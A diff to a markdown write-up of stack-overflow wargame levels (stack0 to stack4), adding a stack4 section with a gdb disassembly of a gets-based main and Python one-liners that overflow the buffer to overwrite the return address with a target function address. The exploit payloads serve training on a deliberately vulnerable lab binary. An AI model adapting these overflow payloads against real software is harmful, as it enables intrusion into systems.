@@ -10,8 +10,10 @@
     - [stack1 solution](#stack1-solution)
   - [stack2](#stack2)
     - [stack2 solution](#stack2-solution)
-  - [stack3 python3 encoding(bad characters)](#stack3-python3-encodingbad-characters)
+  - [stack3: python3 encoding(bad characters)](#stack3-python3-encodingbad-characters)
     - [stack3 solution](#stack3-solution)
+  - [stack4: modify EIP](#stack4-modify-eip)
+    - [stack4 solution](#stack4-solution)
 
 ## stack0
 
@@ -88,7 +90,7 @@ GREENIE=$(python3 -c "print('A' * 64 + '\x0a\x0d\x0a\x0d')");export GREENIE;prin
 ./stack2
 ```
 
-## stack3 python3 encoding(bad characters)
+## stack3: python3 encoding(bad characters)
 
 ```asm
   0x08048475 <+61>:    call   eax 
@@ -115,4 +117,38 @@ r <<< $(python3 -c "print('A' * 64 + '\x24\x84\x04\x08')")
 
 ```sh
 ./stack3 <<< $(python3 -c "print('A' * 64)"|xargs echo -en;echo -en '\x24\x84\x04\x08')
+```
+
+## stack4: modify EIP
+
+```asm
+(gdb) disassemble main
+Dump of assembler code for function main:
+  0x08048408 <+0>:     push   ebp
+  0x08048409 <+1>:     mov    ebp,esp
+  0x0804840b <+3>:     and    esp,0xfffffff0                  # padding, esp <- ebp-0xb
+  0x0804840e <+6>:     sub    esp,0x50
+  0x08048411 <+9>:     lea    eax,[esp+0x10]
+  0x08048415 <+13>:    mov    DWORD PTR [esp],eax
+  0x08048418 <+16>:    call   0x804830c <gets@plt>
+  0x0804841d <+21>:    leave
+  0x0804841e <+22>:    ret
+End of assembler dump. 
+```
+
+```sh
+objdump -d ./stack4
+  # 080483f4
+```
+
+```gdb
+b *main + 22
+r <<< $(python3 -c "print('A' * 120)")
+r <<< $(python3 -c "print('A' * (64 + int(0xb + 0x4)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
+```
+
+### stack4 solution
+
+```sh
+./stack4 <<< $(python3 -c "print('A' * (64 + int(0xb + 0x1)))"|xargs echo -en;echo -en '\xf4\x83\x04\x08')
 ```
